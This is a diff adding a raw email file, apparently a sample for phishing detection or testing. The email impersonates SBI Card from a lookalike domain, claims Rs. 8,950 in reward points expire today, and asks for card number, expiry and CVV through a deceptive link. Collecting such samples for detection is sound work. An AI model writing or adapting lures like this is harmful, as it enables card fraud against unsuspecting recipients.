@@ -1,0 +1,19 @@
+Return-Path: <alert@sbi-secure-kyc.xyz>
+Delivered-To: hr@aicte-india.org
+Received: from mail.aicte-india.org (localhost [127.0.0.1]) by mail.aicte-india.org (Postfix) with ESMTP id 3C2B1A0F9 for <hr@aicte-india.org>; Thu, 11 Sep 2026 09:02:44 +0530 (IST)
+Received: from static.90.55.162.clients.your-server.de (static.90.55.162.clients.your-server.de [162.55.90.10]) by mail.aicte-india.org (Postfix) with ESMTP id 2B1A0F9E8 for <hr@aicte-india.org>; Thu, 11 Sep 2026 09:02:41 +0530 (IST)
+From: "SBI Card Services" <alert@sbi-secure-kyc.xyz>
+To: hr@aicte-india.org
+Subject: SBI Card: Reward points worth Rs. 8,950 expiring today
+Date: Thu, 11 Sep 2026 09:02:30 +0530
+Message-ID: <7f6e5d4c3b2a1@sbi-secure-kyc.xyz>
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<html><body>
+<p>Dear Cardholder,</p>
+<p>Your SBI Card reward points worth <b>Rs. 8,950</b> are expiring today. Redeem now by confirming your card number, expiry and CVV on the rewards portal:</p>
+<p><a href="https://onlinesbi.sbi.kyc-update-portal.top/rewards/redeem?c=HR2291">Redeem Reward Points</a></p>
+<p>Points not redeemed by midnight will lapse permanently.</p>
+<p>SBI Card Rewards Team</p>
+</body></html>
